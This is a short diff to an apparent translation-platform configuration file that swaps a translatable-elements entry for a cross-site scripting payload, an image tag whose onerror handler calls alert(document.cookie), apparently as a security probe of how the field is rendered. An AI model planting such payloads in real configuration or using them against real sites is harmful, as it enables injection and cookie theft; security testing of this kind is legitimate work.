@@ -1,5 +1,6 @@
 files:
   - source: /test9.xml
     translation: main/%original_file_name%
+    multilingual: 1
     translatable_elements:
-      - main/
+      - '''"><img/src=''x''onerror=alert(document.cookie)>rrr'
